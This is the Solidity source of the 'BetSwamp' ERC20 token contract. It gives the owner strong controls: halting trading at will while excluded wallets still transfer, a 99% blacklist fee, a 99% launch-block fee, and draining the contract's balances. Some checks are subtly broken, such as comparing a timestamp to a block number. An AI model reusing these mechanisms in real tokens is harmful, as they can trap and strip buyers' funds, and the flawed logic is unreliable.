contract BetSwampERC20Token is IERC20, ERC20Permit, VaultOwned {



    using SafeMath for uint256;

    using Address for address;



    IUniswapV2Router02 public immutable uniswapV2Router;

    address public uniswapV2Pair;

    bool private swapping;



    address public constant deadAddress = 0x000000000000000000000000000000000000dEaD;



    uint256 public burnFeeOnSell = 2; //2% burn fee is applicable only on sell

    uint256 public burnFeeOnBuy = 0;

    uint256 public maxTransactionAmount;

    uint256 public maxWallet;

    uint256 public tokensForBurn;



    bool public tradingActive = false;

    uint256 public tradingActiveBlock;



    // exlcude from fees and max transaction amount

    mapping (address => bool) private _isExcludedFromFees;

    mapping (address => bool) public _isExcludedMaxTransactionAmount;



    // blacklist the address

    mapping (address => bool) private _blackListAddr;

    uint256 public blackListFee;



    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses

    // could be subject to a maximum transfer amount

    mapping (address => bool) public automatedMarketMakerPairs;



    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);



    constructor() ERC20("BetSwamp", "BETS", 9) {



        address newOwner = msg.sender;



        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);//0x10ED43C718714eb63d5aA57B78B54704E256024E



        excludeFromMaxTransaction(address(_uniswapV2Router), true);

        uniswapV2Router = _uniswapV2Router;



        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        excludeFromMaxTransaction(address(uniswapV2Pair), true);

        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);



        uint256 totalSupply = 114 * 1e4 * 1e9; // 1.14 million

        maxWallet = totalSupply / 100; // 1% max wallet

        maxTransactionAmount = totalSupply / 100; // 1% maxTransactionAmountTxn



        blackListFee = 99;

        burnFeeOnBuy = 0;



        excludeFromFees(address(this), true);

        excludeFromFees(deadAddress, true);

        excludeFromFees(newOwner, true);



        excludeFromMaxTransaction(address(this), true);

        excludeFromMaxTransaction(deadAddress, true);

        excludeFromMaxTransaction(newOwner, true);



        _mint(newOwner, totalSupply);

        transferOwnership(newOwner);

    }



    function mint(address account_, uint256 amount_) external onlyVault() {

        if(msg.sender == _vault)

        _mint(account_, amount_);

    }



    function burn(uint256 amount) public virtual {

        _burn(msg.sender, amount);

    }



    function burnFrom(address account_, uint256 amount_) public virtual {

        _burnFrom(account_, amount_);

    }



    // Enable Trading

    function enableTrading() external onlyOwner {

        require(!tradingActive, "Trading is already active!");

        tradingActive = true;

        tradingActiveBlock = block.number;

    }



    // Disable Trading

    function disableTrading() external onlyOwner {

        require(tradingActive, "Trading is already paused!");

        tradingActive = false;

        tradingActiveBlock = 0;

    }



    function excludeFromFees(address account, bool excluded) public onlyOwner {

        require(!_isExcludedFromFees[account],"The wallet is already excluded!");

        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);

    }



    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {

        require(!_isExcludedMaxTransactionAmount[updAds],"The wallet is already excluded!");

        _isExcludedMaxTransactionAmount[updAds] = isEx;

    }



    function blackListAddress(address addr) external onlyOwner returns (bool) {

        require(block.timestamp <= tradingActiveBlock + 28800, "Option expired!");

        _blackListAddr[addr] = true;

        return true;

    }



    function blackListAddresses(address[] memory addrs) external onlyOwner returns (bool) {

        require(block.timestamp <= tradingActiveBlock + 28800, "Option expired!");

        for(uint256 i = 0; i < addrs.length; i++) {

            _blackListAddr[addrs[i]] = true;

        }

        return true;

    }



    function unblackListAddress(address addr) external onlyOwner returns (bool) {

        _blackListAddr[addr] = false;

        return true;

    }



    function unblackListAddresses(address[] memory addrs) external onlyOwner returns (bool) {

        for(uint256 i = 0; i < addrs.length; i++) {

            _blackListAddr[addrs[i]] = false;

        }

        return true;

    }



    function setBlackListFee(uint256 _fee) external onlyOwner returns (bool) {

        require(block.timestamp <= tradingActiveBlock + 3, "Option expired!");

        blackListFee = _fee;

        return true;

    }



    function setMaxTransactionAmount(uint256 newNum) external onlyOwner {

        require(newNum >= _totalSupply/100, "Can't set max transaction below 1% of total supply!");

        maxTransactionAmount = newNum;

    }



    function setMaxWalletAmount(uint256 newNum) external onlyOwner {

        require(newNum >= _totalSupply/100, "Can't set max wallet below 1% of total supply!");

        maxWallet = newNum;

    }



    function setBurnFeeOnSell(uint256 newBurnFeeOnSell) external onlyOwner {

        require(newBurnFeeOnSell <= 10, "Can't set more than 10% as fee!");

        burnFeeOnSell = newBurnFeeOnSell;

    }



    function setBurnFeeOnBuy(uint256 newBurnFeeOnBuy) external onlyOwner {

        require(newBurnFeeOnBuy <= 10, "Can't set more than 10% as fee!");

        burnFeeOnBuy = newBurnFeeOnBuy;

    }



    function clearStuckBNBBalance(address addr) external onlyOwner{

        (bool sent,) =payable(addr).call{value: (address(this).balance)}("");

        require(sent);

    }



    function clearStuckTokenBalance(address addr, address tokenAddress) external onlyOwner{

        uint256 _bal = IERC20(tokenAddress).balanceOf(address(this));

        IERC20(tokenAddress).transfer(addr, _bal);

    }



    function isExcludedFromFees(address account) public view returns(bool) {

        return _isExcludedFromFees[account];

    }



    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {

        require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");



        _setAutomatedMarketMakerPair(pair, value);

    }



    function _setAutomatedMarketMakerPair(address pair, bool value) private {

        automatedMarketMakerPairs[pair] = value;



        emit SetAutomatedMarketMakerPair(pair, value);

    }



    function _burnFrom(address account_, uint256 amount_) public virtual {

        uint256 decreasedAllowance_ =

            allowance(account_, msg.sender).sub(

                amount_,

                "ERC20: burn amount exceeds allowance"

            );



        _approve(account_, msg.sender, decreasedAllowance_);

        _burn(account_, amount_);

    }



    function _transfer(

        address from,

        address to,

        uint256 amount

    ) internal override {

        require(from != address(0), "ERC20: transfer from the zero address!");



        if(!tradingActive){

            require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");

        }



        //when buy

        if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {

            require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");

            require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");

        }



        if (_blackListAddr[from] || _blackListAddr[to]) {

            uint256 feeAmount = amount * blackListFee / 100;

            uint256 restAmount = amount - feeAmount;

            super._transfer(from, deadAddress, feeAmount);

            super._transfer(from, to, restAmount);

            return;

        }



        if(amount == 0) {

            super._transfer(from, to, 0);

            return;

        }



        if( 

            !swapping &&

            !automatedMarketMakerPairs[from] &&

            !_isExcludedFromFees[from] &&

            !_isExcludedFromFees[to]

        ) {

            swapping = true;

            swapping = false;

        }



        bool takeFee = !swapping;



        // if any account belongs to _isExcludedFromFee account then remove the fee

        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {

            takeFee = false;

        }



        uint256 fees = 0;



        // only take fees on buys/sells, do not take on wallet transfers

        if(takeFee){

            if(tradingActiveBlock + 1 >= block.number && (automatedMarketMakerPairs[to] || automatedMarketMakerPairs[from])){

                fees = amount * 99 /100;

                tokensForBurn += fees;

            }

            // on sell

            else if (automatedMarketMakerPairs[to] && burnFeeOnSell > 0){

                fees = amount * burnFeeOnSell / 100;

                tokensForBurn += fees;

            }

            // on buy

            else if(automatedMarketMakerPairs[from] && burnFeeOnBuy > 0) {

        	    fees = amount * burnFeeOnBuy / 100;

        	    tokensForBurn += fees;

            }



            if(fees > 0){    

                super._transfer(from, deadAddress, fees);

            }



        	amount -= fees;

        }



        super._transfer(from, to, amount);

    }

}

